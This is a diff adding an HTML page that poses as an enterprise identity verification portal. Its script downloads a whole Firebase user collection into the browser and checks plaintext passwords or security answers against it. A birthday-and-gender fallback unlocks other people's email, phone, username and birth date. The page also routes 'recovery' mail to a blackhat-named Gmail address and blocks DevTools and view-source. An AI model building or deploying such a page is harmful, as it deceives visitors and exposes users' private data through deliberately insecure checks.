@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><link rel="icon" type="image/x-icon" href="assets/images/logo.png" />
+
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BXKBQGXFW9"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BXKBQGXFW9');
+</script>
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-T26VKWVH');</script>
+<!-- End Google Tag Manager -->
+
+    
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enterprise Sign-In & Global Identity Verification Service</title>
+<meta name="description" content="Securely authenticate and verify organizational directory credentials. Access the unified management terminal for enterprise profile synchronization and identity protection.">
+<meta name="keywords" content="Enterprise Sign-In, Identity Verification, Multi-Factor Authentication, Secure Portal, Access Management">
+<meta name="robots" content="index, follow">
+
+<meta property="og:url" content="https://verify.enterprise-access.org">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Enterprise Sign-In & Identity Verification Service">
+<meta property="og:description" content="Securely authenticate and verify organizational directory credentials. Access the unified management terminal for enterprise profile synchronization.">
+<meta property="og:image" content="https://img.icons8.com/fluent/512/microsoft-control-panel.png">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:domain" content="verify.enterprise-access.org">
+<meta property="twitter:url" content="https://verify.enterprise-access.org">
+<meta name="twitter:title" content="Enterprise Sign-In & Identity Verification Service">
+<meta name="twitter:description" content="Securely authenticate and verify organizational directory credentials. Access the unified management terminal for enterprise profile synchronization.">
+<meta name="twitter:image" content="https://img.icons8.com/fluent/512/microsoft-control-panel.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/remixicon/fonts/remixicon.css" rel="stylesheet">
+<style>
+:root {
+    --glass-bg: rgba(9, 15, 30, 0.82);
+    --glass-border: rgba(255, 255, 255, 0.07);
+    --glass-inner: rgba(255, 255, 255, 0.02);
+    --primary: #2563eb;
+    --primary-hover: #1d4ed8;
+    --text-muted: #94a3b8;
+    --success: #10b981;
+    --danger: #ef4444;
+}
+
+body {
+    font-family: 'Inter', sans-serif;
+    background: url('assets/images/bgp.png') no-repeat center center fixed;
+    background-size: cover;
+    color: #f8fafc;
+    margin: 0;
+    padding: 20px;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    box-sizing: border-box;
+}
+
+/* Master Responsive Dashboard Container */
+.main-dashboard {
+    width: 100%;
+    max-width: 540px;
+    background: var(--glass-bg);
+    backdrop-filter: blur(40px) saturate(180%);
+    -webkit-backdrop-filter: blur(40px) saturate(180%);
+    border: 1px solid var(--glass-border);
+    border-radius: 28px;
+    padding: 30px;
+    box-shadow: 0 35px 90px rgba(0, 0, 0, 0.65);
+    box-sizing: border-box;
+    transition: max-width 0.4s ease, padding 0.4s ease;
+}
+
+/* Multi-Column Desktop Grid Extension Rules */
+@media (min-width: 768px) {
+    .main-dashboard {
+        max-width: 940px;
+        padding: 50px;
+    }
+    .info-grid {
+        grid-template-columns: repeat(3, 1fr) !important;
+    }
+    .split-row {
+        display: flex;
+        gap: 20px;
+    }
+    .split-row .input-group {
+        flex: 1;
+    }
+}
+
+.app-header {
+    text-align: center;
+    margin-bottom: 35px;
+}
+
+.app-header h2 {
+    margin: 0;
+    font-size: 26px;
+    font-weight: 700;
+    letter-spacing: -0.03em;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+}
+
+.app-header h2 i { color: var(--primary); }
+.app-header p { color: var(--text-muted); font-size: 14px; margin: 8px 0 0 0; }
+
+.input-group {
+    margin-bottom: 22px;
+}
+
+.input-group label {
+    display: block;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    color: var(--text-muted);
+    margin-bottom: 8px;
+    font-weight: 600;
+}
+
+.input-wrapper {
+    position: relative;
+    display: flex;
+    align-items: center;
+}
+
+.input-wrapper i.input-icon {
+    position: absolute;
+    left: 16px;
+    color: var(--text-muted);
+    font-size: 18px;
+}
+
+.input {
+    width: 100%;
+    padding: 16px 16px 16px 48px;
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 14px;
+    background: rgba(0, 0, 0, 0.45);
+    color: white;
+    font-size: 15px;
+    outline: none;
+    transition: all 0.2s ease;
+    box-sizing: border-box;
+}
+
+.input:focus {
+    border-color: var(--primary);
+    background: rgba(0, 0, 0, 0.6);
+    box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.18);
+}
+
+.btn {
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 14px;
+    background: var(--primary);
+    color: white;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    transition: all 0.2s ease;
+}
+
+.btn:hover:not(:disabled) { background: var(--primary-hover); }
+.btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+.btn-secondary {
+    background: rgba(255, 255, 255, 0.05);
+    color: #f1f5f9;
+    border: 1px solid rgba(255, 255, 255, 0.03);
+}
+.btn-secondary:hover { background: rgba(255, 255, 255, 0.1); }
+
+.btn-danger {
+    background: rgba(239, 68, 68, 0.2);
+    color: #fca5a5;
+    border: 1px solid rgba(239, 68, 68, 0.3);
+}
+.btn-danger:hover { background: rgba(239, 68, 68, 0.3); }
+
+.link-action {
+    display: inline-block;
+    margin-top: 14px;
+    font-size: 13px;
+    color: var(--text-muted);
+    text-decoration: underline;
+    cursor: pointer;
+    transition: color 0.2s;
+}
+.link-action:hover { color: #f1f5f9; }
+
+.account-card {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: var(--glass-inner);
+    border: 1px solid rgba(255, 255, 255, 0.04);
+    padding: 18px 22px;
+    border-radius: 16px;
+    cursor: pointer;
+    margin-top: 14px;
+    animation: fadeIn 0.3s ease;
+}
+
+.account-card:hover {
+    background: rgba(255, 255, 255, 0.07);
+    border-color: var(--primary);
+}
+
+.account-info { display: flex; align-items: center; gap: 16px; }
+.avatar { width: 48px; height: 48px; border-radius: 50%; object-fit: cover; border: 2px solid rgba(255, 255, 255, 0.1); }
+.account-name { font-weight: 600; font-size: 16px; }
+
+.banner-badge {
+    padding: 14px 18px;
+    border-radius: 14px;
+    font-size: 13px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 24px;
+    line-height: 1.5;
+}
+.banner-badge.warning { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.18); color: #fde047; }
+.banner-badge.info { background: rgba(37, 99, 235, 0.08); border: 1px solid rgba(37, 99, 235, 0.18); color: #93c5fd; }
+.banner-badge.error { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.18); color: #fca5a5; }
+
+.email-preview-container {
+    background: rgba(0, 0, 0, 0.3);
+    border: 1px solid rgba(255, 255, 255, 0.05);
+    border-radius: 14px;
+    padding: 16px;
+    margin: 18px 0;
+    font-family: monospace;
+    font-size: 13px;
+    color: #cbd5e1;
+    white-space: pre-wrap;
+    text-align: left;
+    max-height: 180px;
+    overflow-y: auto;
+}
+
+.info-grid {
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 16px;
+    margin-bottom: 35px;
+}
+
+.info-item {
+    background: rgba(0, 0, 0, 0.25);
+    border: 1px solid rgba(255, 255, 255, 0.04);
+    padding: 16px 20px;
+    border-radius: 14px;
+}
+
+.info-item span { display: block; font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; }
+.info-item .val-box { display: flex; align-items: center; justify-content: space-between; gap: 10px; }
+.info-item strong { font-size: 14px; color: #f1f5f9; word-break: break-all; font-weight: 600; }
+
+.action-btn { background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 16px; padding: 4px; transition: color 0.2s; }
+.action-btn:hover { color: white; }
+
+.loader-box { display: flex; flex-direction: column; align-items: center; padding: 30px 0; gap: 12px; }
+.spinner { width: 28px; height: 28px; border: 3px solid rgba(255, 255, 255, 0.1); border-radius: 50%; border-top-color: var(--primary); animation: spin 0.8s linear infinite; }
+.feedback-msg { text-align: center; padding: 15px 0; color: var(--text-muted); font-size: 14px; }
+
+.stage { animation: fadeIn 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+.hidden { display: none !important; }
+
+@keyframes spin { to { transform: rotate(360deg); } }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+</style>
+</head>
+<body>
+
+    <!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T26VKWVH"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+<div class="main-dashboard">
+    
+    <div class="app-header" id="appHeader">
+        <h2><i class="ri-shield-check-fill"></i> Secure Identity Access Terminal</h2>
+        <p id="headerDesc">Authorized directory verification system with tiered structural fallback logic</p>
+    </div>
+
+    <div id="stageSearch" class="stage">
+        <div class="input-group">
+            <label>Registered System Parameter Reference</label>
+            <div class="input-wrapper">
+                <i class="ri-user-search-line input-icon"></i>
+                <input id="searchInput" class="input" placeholder="Enter identification email or phone record" onkeydown="if(event.key==='Enter') findAccounts()">
+            </div>
+        </div>
+        <button class="btn" id="searchBtn" onclick="findAccounts()">
+            <span>Query Directory</span><i class="ri-arrow-right-line"></i>
+        </button>
+        <div id="resultsWrapper"></div>
+    </div>
+
+    <div id="stagePrimaryGate" class="stage hidden">
+        <div class="banner-badge warning">
+            <i class="ri-fingerprint-line" style="font-size:22px;"></i>
+            <span>Supply the account access password OR input the correct response matching the specific security challenge statement.</span>
+        </div>
+        
+        <div class="split-row">
+            <div class="input-group">
+                <label>Method A: Account Password</label>
+                <div class="input-wrapper">
+                    <i class="ri-lock-password-line input-icon"></i>
+                    <input id="primaryPasswordInput" type="password" class="input" placeholder="Enter matching account password">
+                </div>
+            </div>
+            <div class="input-group">
+                <label id="primaryQuestionLabel">Method B: Security Question Challenge</label>
+                <div class="input-wrapper">
+                    <i class="ri-question-answer-line input-icon"></i>
+                    <input id="primaryAnswerInput" class="input" placeholder="Enter registration security answer">
+                </div>
+            </div>
+        </div>
+
+        <div id="primaryGateFeedback"></div>
+        
+        <div style="text-align: center; margin-bottom: 10px;">
+            <span class="link-action" onclick="routeToBirthdayFallback()">Forgot both credentials? Initiate personal attribute mapping</span>
+        </div>
+
+        <div style="display:flex; gap:14px; margin-top:20px;">
+            <button class="btn btn-secondary" style="flex:1" onclick="backToSearch()"><i class="ri-arrow-left-line"></i> Back</button>
+            <button class="btn" style="flex:1" onclick="verifyPrimaryGate()"><span>Verify Parameters</span><i class="ri-lock-unlock-line"></i></button>
+        </div>
+    </div>
+
+    <div id="stageBirthdayGate" class="stage hidden">
+        <div class="banner-badge info">
+            <i class="ri-calendar-todo-line" style="font-size:22px;"></i>
+            <span>Verification tier 1 active. Provide the complete date of birth sequence registered to this profile index.</span>
+        </div>
+        <div class="input-group">
+            <label>Registered Date of Birth</label>
+            <div class="input-wrapper">
+                <i class="ri-calendar-line input-icon"></i>
+                <input id="birthdayInput" class="input" placeholder="YYYY-MM-DD (e.g., 1995-10-24)">
+            </div>
+        </div>
+        <div id="birthdayFeedback"></div>
+        
+        <div style="text-align: center; margin-bottom: 10px;">
+            <span class="link-action" onclick="routeToSupportStage()">Forgot birthday configuration? Contact manual verification deck</span>
+        </div>
+
+        <div style="display:flex; gap:14px; margin-top:25px;">
+            <button class="btn btn-secondary" style="flex:1" onclick="backToPrimaryGate()"><i class="ri-arrow-left-line"></i> Back</button>
+            <button class="btn" style="flex:1" onclick="verifyBirthdayGate()"><span>Validate Metric</span><i class="ri-arrow-right-line"></i></button>
+        </div>
+    </div>
+
+    <div id="stageGenderGate" class="stage hidden">
+        <div class="banner-badge info">
+            <i class="ri-user-settings-line" style="font-size:22px;"></i>
+            <span>Verification tier 2 active. Specify the exact classification gender entry mapped to this data node.</span>
+        </div>
+        <div class="input-group">
+            <label>Registered Gender Class</label>
+            <div class="input-wrapper">
+                <i class="ri-genderless-line input-icon"></i>
+                <input id="genderInput" class="input" placeholder="e.g., Male, Female, Other">
+            </div>
+        </div>
+        <div id="genderFeedback"></div>
+
+        <div style="text-align: center; margin-bottom: 10px;">
+            <span class="link-action" onclick="routeToSupportStage()">Mismatched gender entry? Request manual verification file</span>
+        </div>
+
+        <div style="display:flex; gap:14px; margin-top:25px;">
+            <button class="btn btn-secondary" style="flex:1" onclick="backToBirthdayGate()"><i class="ri-arrow-left-line"></i> Back</button>
+            <button class="btn" style="flex:1" onclick="verifyGenderGate()"><span>Finalize Attribute Sync</span><i class="ri-checkbox-circle-line"></i></button>
+        </div>
+    </div>
+
+    <div id="stageSupportGate" class="stage hidden">
+        <div class="banner-badge error">
+            <i class="ri-mail-forbid-line" style="font-size:22px;"></i>
+            <span>Automated identity challenge failed. A formal manual identity reconciliation file has been formatted for submission.</span>
+        </div>
+
+        <div style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); letter-spacing: 0.05em; font-weight: 600;">Outbound Dispatch Preview</div>
+        <div class="email-preview-container" id="emailPreviewBox"></div>
+
+        <button class="btn btn-danger" id="dispatchEmailBtn">
+            <i class="ri-mail-send-fill"></i> Send File to Verification Deck
+        </button>
+
+        <button class="btn btn-secondary" style="margin-top:15px;" onclick="resetFlow()">
+            <i class="ri-restart-line"></i> Restart Terminal Verification
+        </button>
+    </div>
+
+    <div id="stageDetails" class="stage hidden">
+        <div style="text-align:center; margin-bottom:30px;">
+            <img id="detailsAvatar" class="avatar" style="width:90px; height:90px; border:3px solid var(--success);" src="">
+            <h3 id="detailsTitle" style="margin:14px 0 4px 0; font-size:22px;"></h3>
+            <span id="detailsUid" style="font-size:12px; color:var(--text-muted); font-family: monospace;"></span>
+        </div>
+
+        <div class="info-grid">
+            <div class="info-item">
+                <span>Account Primary Email</span>
+                <div class="val-box">
+                    <strong id="valEmail"></strong>
+                    <button class="action-btn" onclick="copyValue('valEmail')"><i class="ri-file-copy-line"></i></button>
+                </div>
+            </div>
+            <div class="info-item">
+                <span>Username Alias</span>
+                <div class="val-box">
+                    <strong id="valUsername"></strong>
+                    <button class="action-btn" onclick="copyValue('valUsername')"><i class="ri-file-copy-line"></i></button>
+                </div>
+            </div>
+            <div class="info-item">
+                <span>Mobile Contact String</span>
+                <div class="val-box"><strong id="valPhone"></strong></div>
+            </div>
+            <div class="info-item">
+                <span>Geographic Locality</span>
+                <div class="val-box"><strong id="valCountry"></strong></div>
+            </div>
+            <div class="info-item">
+                <span>Date of Birth Metric</span>
+                <div class="val-box"><strong id="valBirth"></strong></div>
+            </div>
+            <div class="info-item">
+                <span>System Security State</span>
+                <div class="val-box"><strong style="color:var(--success); font-size:13px;"><i class="ri-shield-check-line"></i> Validated Profile</strong></div>
+            </div>
+        </div>
+
+        <button class="btn btn-secondary" onclick="resetFlow()"><i class="ri-restart-line"></i> Initialize Clean Diagnostic Session</button>
+    </div>
+
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyBO2Um_hyje276BKf96Alae-5_UmbbLDN4",
+  authDomain: "cavexa-2009.firebaseapp.com",
+  databaseURL: "https://cavexa-2009-default-rtdb.firebaseio.com",
+  projectId: "cavexa-2009",
+  storageBucket: "cavexa-2009.firebasestorage.app",
+  messagingSenderId: "159385487748",
+  appId: "1:159385487748:web:10e6a4ed33aca2aee5f5d1"
+};
+
+firebase.initializeApp(firebaseConfig);
+const firestore = firebase.firestore();
+const realtimeDB = firebase.database();
+
+let foundUsers = [];
+let targetedUserIndex = null;
+
+async function findAccounts(){
+    const rawQuery = document.getElementById("searchInput").value.trim();
+    if(!rawQuery) return;
+
+    const wrapper = document.getElementById("resultsWrapper");
+    const searchBtn = document.getElementById("searchBtn");
+
+    wrapper.innerHTML = `
+        <div class="loader-box">
+            <div class="spinner"></div>
+            <span style="color:var(--text-muted); font-size:12px;">Querying database catalogs...</span>
+        </div>`;
+    searchBtn.disabled = true;
+    foundUsers = [];
+
+    try {
+        const snap = await firestore.collection("users").get();
+
+        for(const doc of snap.docs){
+            const user = doc.data();
+            const recoveryEmail = (user.recoveryEmail || "").toLowerCase();
+            const phone = (user.phone || "").replace(/\s+/g,'');
+            const search = rawQuery.toLowerCase().replace(/\s+/g,'');
+
+            if(recoveryEmail === search || phone === search){
+                let avatar = "";
+                try {
+                    const avatarSnap = await realtimeDB.ref("avatars/"+doc.id).once("value");
+                    avatar = avatarSnap.val() || "";
+                } catch(e){}
+
+                foundUsers.push({ uid: doc.id, avatar, ...user });
+            }
+        }
+
+        if(!foundUsers.length){
+            wrapper.innerHTML = `<div class="feedback-msg" style="color:var(--danger);"><i class="ri-error-warning-line"></i> Matching entry pointer could not be found.</div>`;
+            return;
+        }
+
+        wrapper.innerHTML = `<div style="font-size:11px; color:var(--text-muted); margin:18px 0 6px 0; font-weight:600; letter-spacing:0.05em;">MATCHED PROFILE INDEXES (${foundUsers.length})</div>`;
+
+        foundUsers.forEach((user, index) => {
+            const div = document.createElement("div");
+            div.className = "account-card";
+            div.innerHTML = `
+                <div class="account-info">
+                    <img class="avatar" src="${user.avatar || 'https://ui-avatars.com/api/?background=2563eb&color=fff&name='+encodeURIComponent(user.displayName||'U')}">
+                    <div>
+                        <div class="account-name">${user.displayName || user.givenName || 'Protected Profile'}</div>
+                        <div style="font-size:12px; color:var(--text-muted); margin-top:2px;">Identity Validation Gate Active</div>
+                    </div>
+                </div>
+                <i class="ri-shield-user-line" style="color:var(--primary); font-size:20px;"></i>
+            `;
+            div.onclick = () => routeToPrimaryGate(index);
+            wrapper.appendChild(div);
+        });
+
+    } catch (err) {
+        wrapper.innerHTML = `<div class="feedback-msg" style="color:var(--danger);">Error synchronizing cloud directory index query.</div>`;
+    } finally {
+        searchBtn.disabled = false;
+    }
+}
+
+function routeToPrimaryGate(index) {
+    targetedUserIndex = index;
+    const user = foundUsers[index];
+
+    document.getElementById("stageSearch").classList.add("hidden");
+    document.getElementById("stagePrimaryGate").classList.remove("hidden");
+    document.getElementById("stageBirthdayGate").classList.add("hidden");
+    document.getElementById("stageGenderGate").classList.add("hidden");
+    document.getElementById("stageSupportGate").classList.add("hidden");
+
+    document.getElementById("appHeader").querySelector("h2").innerHTML = `<i class="ri-git-lock-line"></i> Core Authentication Pipeline`;
+    document.getElementById("headerDesc").innerText = "Verify file configuration using direct memory identifiers.";
+
+    const rawQuestion = user.securityQuestion || "Security Question Parameter";
+    document.getElementById("primaryQuestionLabel").innerText = `Method B: ${rawQuestion.toUpperCase()}`;
+
+    document.getElementById("primaryPasswordInput").value = "";
+    document.getElementById("primaryAnswerInput").value = "";
+    document.getElementById("primaryGateFeedback").innerHTML = "";
+}
+
+function verifyPrimaryGate() {
+    const checkedPsw = document.getElementById("primaryPasswordInput").value.trim();
+    const checkedAns = document.getElementById("primaryAnswerInput").value.trim().toLowerCase();
+    const feedback = document.getElementById("primaryGateFeedback");
+    const user = foundUsers[targetedUserIndex];
+
+    const actualPsw = user.passwordPlain || "";
+    const actualAns = (user.securityAnswer || "").trim().toLowerCase();
+
+    if (!checkedPsw && !checkedAns) {
+        feedback.innerHTML = `<div class="feedback-msg" style="color:var(--danger);">Provide a response to at least one credential challenge vector.</div>`;
+        return;
+    }
+
+    let authenticated = false;
+    if (checkedPsw && checkedPsw === actualPsw) authenticated = true;
+    if (checkedAns && checkedAns === actualAns) authenticated = true;
+
+    if (authenticated) {
+        revealProfilePayload(user);
+    } else {
+        feedback.innerHTML = `
+            <div class="feedback-msg" style="color:var(--danger); background:rgba(239,68,68,0.06); border:1px solid rgba(239,68,68,0.15); padding:12px; border-radius:12px; margin-top:14px;">
+                <i class="ri-close-circle-line"></i> Credentials matching parameters failed assessment analysis.
+            </div>`;
+    }
+}
+
+function routeToBirthdayFallback() {
+    document.getElementById("stagePrimaryGate").classList.add("hidden");
+    document.getElementById("stageBirthdayGate").classList.remove("hidden");
+    
+    document.getElementById("appHeader").querySelector("h2").innerHTML = `<i class="ri-shield-flash-line" style="color:var(--warning)"></i> Attrib Verification: Step 1`;
+    document.getElementById("headerDesc").innerText = "Attribute mapping assessment sequence. Verification parameter: Birthday.";
+
+    document.getElementById("birthdayInput").value = "";
+    document.getElementById("birthdayFeedback").innerHTML = "";
+}
+
+function verifyBirthdayGate() {
+    const user = foundUsers[targetedUserIndex];
+    const inputBirth = document.getElementById("birthdayInput").value.trim().toLowerCase();
+    const targetBirth = (user.birthday || "").trim().toLowerCase();
+    const feedback = document.getElementById("birthdayFeedback");
+
+    if (!inputBirth) return;
+
+    if (inputBirth === targetBirth) {
+        document.getElementById("stageBirthdayGate").classList.add("hidden");
+        document.getElementById("stageGenderGate").classList.remove("hidden");
+        
+        document.getElementById("appHeader").querySelector("h2").innerHTML = `<i class="ri-shield-flash-line" style="color:var(--warning)"></i> Attrib Verification: Step 2`;
+        document.getElementById("headerDesc").innerText = "Profile index category evaluation sequence. Verification parameter: Gender.";
+        
+        document.getElementById("genderInput").value = "";
+        document.getElementById("genderFeedback").innerHTML = "";
+    } else {
+        feedback.innerHTML = `<div class="feedback-msg" style="color:var(--danger);">The provided birthday parameter does not match the file registry database.</div>`;
+    }
+}
+
+function verifyGenderGate() {
+    const user = foundUsers[targetedUserIndex];
+    const inputGender = document.getElementById("genderInput").value.trim().toLowerCase();
+    const targetGender = (user.gender || "").trim().toLowerCase();
+    const feedback = document.getElementById("genderFeedback");
+
+    if (!inputGender) return;
+
+    if (inputGender === targetGender) {
+        revealProfilePayload(user);
+    } else {
+        feedback.innerHTML = `<div class="feedback-msg" style="color:var(--danger);">Profile structure category verification failure. Gender index rejected.</div>`;
+    }
+}
+
+/* Escalated Manual Assistance Desk Route */
+function routeToSupportStage() {
+    // Hide active attributes stages
+    document.getElementById("stagePrimaryGate").classList.add("hidden");
+    document.getElementById("stageBirthdayGate").classList.add("hidden");
+    document.getElementById("stageGenderGate").classList.add("hidden");
+    document.getElementById("stageSupportGate").classList.remove("hidden");
+
+    document.getElementById("appHeader").querySelector("h2").innerHTML = `<i class="ri-customer-service-2-fill" style="color:var(--danger)"></i> Reconciliation Protocol Active`;
+    document.getElementById("headerDesc").innerText = "Submit structured system configuration parameters to management deck for manual recovery.";
+
+    const user = foundUsers[targetedUserIndex];
+    
+    // Structure a highly professional email format
+    const targetSupportMail = "blackhatdevelopers.recruitment@gmail.com"; 
+    const subjectLine = encodeURIComponent(`URGENT: Manual Account Verification & Recovery Request - UID: ${user.uid || 'UNKNOWN'}`);
+    
+    const plainBodyText = `Official Identity Reconciliation Log
+----------------------------------------------------------------------
+Log Entry Generation Time: ${new Date().toLocaleString()}
+Target Directory Record Unique ID: ${user.uid || 'Not Defined'}
+Reported Organization Profile Label: ${user.displayName || user.givenName || 'Not Declared'}
+----------------------------------------------------------------------
+
+Dear Access Control Board and Administrative Management Team,
+
+This transmission serves as an official request for manual security reconciliation and archive portfolio reactivation regarding the profile referenced above.
+
+The client-side automated multi-factor authentication challenge wizard was unable to resolve dynamic clearance authorization markers for this user node. The identity owner has reported a loss of access covering the primary authorization passwords, historical security parameters, and registry-linked profile attributes.
+
+We kindly request that an administrative supervisor initiates a folder asset validation process to review identity compliance, re-verify ownership parameters, and securely update credential parameters for this account folder.
+
+Respectfully submitted,
+Identity Services Control Terminal System Operator
+Local Session Identifier: 0x${Math.floor(Math.random()*16777215).toString(16).toUpperCase()}`;
+
+    // Render plain textual layout inside preview box for user clarity
+    document.getElementById("emailPreviewBox").innerText = `To: ${targetSupportMail}\nSubject: Account Recovery Request\n\n${plainBodyText}`;
+
+    // Configure programmatic anchor execution point
+    document.getElementById("dispatchEmailBtn").onclick = function() {
+        window.location.href = `mailto:${targetSupportMail}?subject=${subjectLine}&body=${encodeURIComponent(plainBodyText)}`;
+    };
+}
+
+function revealProfilePayload(user) {
+    document.getElementById("stagePrimaryGate").classList.add("hidden");
+    document.getElementById("stageBirthdayGate").classList.add("hidden");
+    document.getElementById("stageGenderGate").classList.add("hidden");
+    document.getElementById("stageSupportGate").classList.add("hidden");
+    document.getElementById("stageDetails").classList.remove("hidden");
+
+    document.getElementById("appHeader").querySelector("h2").innerHTML = `<i class="ri-verified-badge-fill" style="color:var(--success)"></i> Identity Access Clear`;
+    document.getElementById("headerDesc").innerText = "Target node verified. System profile compiled with optimized security schemas.";
+
+    document.getElementById("detailsAvatar").src = user.avatar || 'https://ui-avatars.com/api/?background=10b981&color=fff&name=' + encodeURIComponent(user.displayName||'U');
+    document.getElementById("detailsTitle").innerText = user.displayName || user.givenName || "Verified Account Node";
+    document.getElementById("detailsUid").innerText = "UID: " + user.uid;
+
+    // Display metadata schemas cleanly without any password visual frames
+    document.getElementById("valEmail").innerText = user.email || "No Registered Email Available";
+    document.getElementById("valUsername").innerText = user.username ? "@" + user.username : "Unconfigured";
+    document.getElementById("valPhone").innerText = user.phone || "No Telephone Element Linked";
+    document.getElementById("valCountry").innerText = user.country || "Undisclosed Geographic Zone";
+    document.getElementById("valBirth").innerText = user.birthday || "Not Configured";
+}
+
+/* Framework Navigation Controllers */
+function backToSearch() {
+    document.getElementById("stageSearch").classList.remove("hidden");
+    document.getElementById("stagePrimaryGate").classList.add("hidden");
+    
+    document.getElementById("appHeader").querySelector("h2").innerHTML = `<i class="ri-shield-check-fill"></i> Secure Identity Access Terminal`;
+    document.getElementById("headerDesc").innerText = "Authorized directory verification system with tiered structural fallback logic";
+}
+
+function backToPrimaryGate() {
+    document.getElementById("stageBirthdayGate").classList.add("hidden");
+    routeToPrimaryGate(targetedUserIndex);
+}
+
+function backToBirthdayGate() {
+    document.getElementById("stageGenderGate").classList.add("hidden");
+    routeToBirthdayFallback();
+}
+
+function resetFlow() {
+    document.getElementById("searchInput").value = "";
+    document.getElementById("resultsWrapper").innerHTML = "";
+    document.getElementById("stageDetails").classList.add("hidden");
+    document.getElementById("stageSupportGate").classList.add("hidden");
+    backToSearch();
+}
+
+function copyValue(elementId) {
+    const textToCopy = document.getElementById(elementId).innerText;
+    navigator.clipboard.writeText(textToCopy).then(() => {
+        alert("Parameter string copied cleanly to secure system memory.");
+    });
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+
+/* ================================
+   BASIC PROTECTION SCRIPT
+   (You cannot fully block DevTools,
+   but this blocks common shortcuts)
+   ================================ */
+
+/* Block Right Click */
+document.addEventListener("contextmenu", e => e.preventDefault());
+
+/* Block F12 and DevTools keys */
+document.addEventListener("keydown", e => {
+  // F12
+  if (e.key === "F12") {
+    e.preventDefault();
+  }
+
+  // Ctrl + Shift + (I, J, C)
+  if (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key.toUpperCase())) {
+    e.preventDefault();
+  }
+
+  // Ctrl + U (view source)
+  if (e.ctrlKey && e.key.toLowerCase() === "u") {
+    e.preventDefault();
+  }
+
+  // Block Ctrl key alone
+  if (e.ctrlKey && !e.shiftKey) {
+    e.preventDefault();
+  }
+
+  // Block Shift key alone
+  if (e.key === "Shift" && !e.ctrlKey) {
+    e.preventDefault();
+  }
+});
+
+/* Optional: Block selecting text */
+document.addEventListener("selectstart", e => e.preventDefault());
+
+</script>
+
+<style>
+/* ============================================================
+   CUSTOM SCROLLBAR — GRADIENT (ALWAYS VISIBLE)
+   ============================================================ */
+
+/* Firefox */
+* {
+  scrollbar-width: thin;
+  scrollbar-color: #0011fd #0b0010;
+}
+
+/* Chrome, Edge, Safari */
+::-webkit-scrollbar {
+  width: 6px;
+  height: 6px;
+}
+
+::-webkit-scrollbar-track {
+  background: #0b0010;
+}
+
+::-webkit-scrollbar-thumb {
+  background: linear-gradient(
+     180deg,
+    #3d98ff,
+    #2f78ff,
+    #1b04ec
+  );
+  border-radius: 10px;
+  min-height: 40px;
+}
+
+/* Hover = slightly brighter, not different */
+::-webkit-scrollbar-thumb:hover {
+  background: linear-gradient(
+    180deg,
+    #3d98ff,
+    #2f78ff,
+    #1b04ec
+  );
+}
+
+::-webkit-scrollbar-corner {
+  background: #0b0010;
+}
+</style>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+/* 🚫 Block image dragging */
+document.addEventListener("dragstart", e => {
+  if (e.target.tagName === "IMG") {
+    e.preventDefault();
+  }
+});
+</script>
+
+
+
+<style>/* 🚫 Disable image drag & selection */
+img {
+  -webkit-user-drag: none;
+  user-drag: none;
+  user-select: none;
+  pointer-events: auto;
+}
+</style>
+
+
+
+<style>
+  /* Disable text selection */
+  * {
+    -webkit-user-select: none; /* Safari */
+    -ms-user-select: none;     /* IE/Edge */
+    user-select: none;         /* Standard */
+  }
+
+  /* Disable image dragging */
+  img {
+    -webkit-user-drag: none;
+    user-drag: none;
+    pointer-events: none;
